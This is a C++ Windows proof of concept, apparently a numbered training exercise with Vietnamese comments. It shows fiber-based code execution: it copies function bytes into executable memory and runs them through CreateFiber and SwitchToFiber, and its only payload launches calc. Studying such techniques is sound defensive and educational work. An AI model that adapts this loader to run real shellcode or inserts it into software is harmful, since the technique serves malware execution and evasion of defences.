#include <windows.h>
#include <iostream>
#include <string>

// Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _FIBER_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
    PVOID pMasterFiber;       // Lưu tọa độ Master Fiber để quay về an toàn nếu cần
} FIBER_DATA, * PFIBER_DATA;

// Hàm chức năng độc lập vị trí gánh logic chạy của Worker Fiber
VOID WINAPI WorkerFiberRoutine(LPVOID lpParam) {
    PFIBER_DATA pData = (PFIBER_DATA)lpParam;

    if (pData && pData->pWinExec) {
        // Khai hỏa mở máy tính kịch trần kịch khung dưới tư cách pháp nhân Fiber hợp pháp
        pData->pWinExec(pData->szCommand, SW_SHOWNORMAL);
    }

    // Sau khi thực thi xong, nếu muốn tiến trình Loader không bị tắt phụt vô duyên,
    // ta có thể nhường quyền điều khiển quay trở lại cho Master Fiber
    if (pData && pData->pMasterFiber) {
        SwitchToFiber(pData->pMasterFiber);
    }
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 22: INJECTION THROUGH FIBER" << std::endl;
    std::cout << "====================================================" << std::endl;

    PVOID mainFiber = NULL;
    PVOID workerFiber = NULL;
    PVOID codeBuffer = NULL;

    // Bước 1: Ép luồng Thread chính hiện tại chuyển đổi sang cấu trúc Master Fiber
    mainFiber = ConvertThreadToFiber(NULL);
    if (mainFiber == NULL) {
        std::cerr << "[-] ConvertThreadToFiber that bai! Error: " << GetLastError() << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da kich hoat Master Fiber tai toa do: 0x" << std::hex << mainFiber << std::endl;

    // Bước 2: Cấp phát vùng nhớ động thích ứng cho mã máy thực thi
    SIZE_T payloadSize = 1024;
    codeBuffer = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (codeBuffer == NULL) {
        std::cerr << "[-] VirtualAlloc cap phat RAM that bai!" << std::endl;
        return EXIT_FAILURE;
    }

    // Bước 3: Sao chép mã máy của hàm WorkerFiberRoutine vào phân vùng thực thi phẳng sạch
    memcpy(codeBuffer, (PVOID)WorkerFiberRoutine, 500);

    // Cấu hình cấu trúc dữ liệu tham số nằm lùi về sau ô nhớ mã máy 500 byte
    PFIBER_DATA pLocalData = (PFIBER_DATA)((DWORD_PTR)codeBuffer + 500);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        pLocalData->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(pLocalData->szCommand, "cmd.exe /c start calc");
    pLocalData->pMasterFiber = mainFiber;

    std::cout << "[+] Dong bo cau truc du lieu tham so vao RAM vùa cap phat." << std::endl;

    // Bước 4: Tạo ra một Worker Fiber phụ trỏ thẳng vào vạch xuất phát của phân vùng mã máy
    workerFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)codeBuffer, pLocalData);
    if (workerFiber == NULL) {
        std::cerr << "[-] CreateFiber that bai!" << std::endl;
        VirtualFree(codeBuffer, 0, MEM_RELEASE);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da khoi tao Worker Fiber thanh cong tai: 0x" << std::hex << workerFiber << std::endl;

    std::cout << "[*] Chuan bi SwitchToFiber de thuc hien lenh chuyen doi soi chien luoc..." << std::endl;
    std::cout << "[*] Nhan Enter de kich no..." << std::endl;
    std::cin.get();

    // Bước 5: Thực hiện lệnh chuyển đổi sợi. CPU lập tức đóng ngữ cảnh hiện tại và nhảy vào Fiber phụ
    SwitchToFiber(workerFiber);

    // Khi Worker Fiber hoành tráng xong nhường quyền quay lại đây, ta dọn dẹp bộ nhớ
    std::cout << "[+] Luong CPU da quay tro ve Master Fiber an toan phang sach!" << std::endl;

    DeleteFiber(workerFiber);
    VirtualFree(codeBuffer, 0, MEM_RELEASE);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}